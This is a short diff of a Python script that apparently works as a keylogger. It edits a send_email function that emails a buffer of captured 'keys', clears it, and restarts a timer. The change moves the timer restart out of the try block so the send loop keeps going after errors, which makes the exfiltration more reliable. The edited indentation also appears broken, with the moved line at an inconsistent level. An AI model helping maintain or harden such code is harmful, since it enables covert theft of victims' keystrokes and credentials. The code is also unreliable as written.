@@ -56,9 +56,10 @@ def send_email(email, password):
             server.quit() # Quit the email server
             keys.clear()  # Clear keys after sending email
             print("Email sent successfully") # Print a success message
-            start_timer() # Start the timer again
+           
         except Exception as e:
             print(f"Error sending email: {e}")
+         start_timer() # Start the timer again
 
 # Function to start the timer
 def start_timer(): # Start the timer
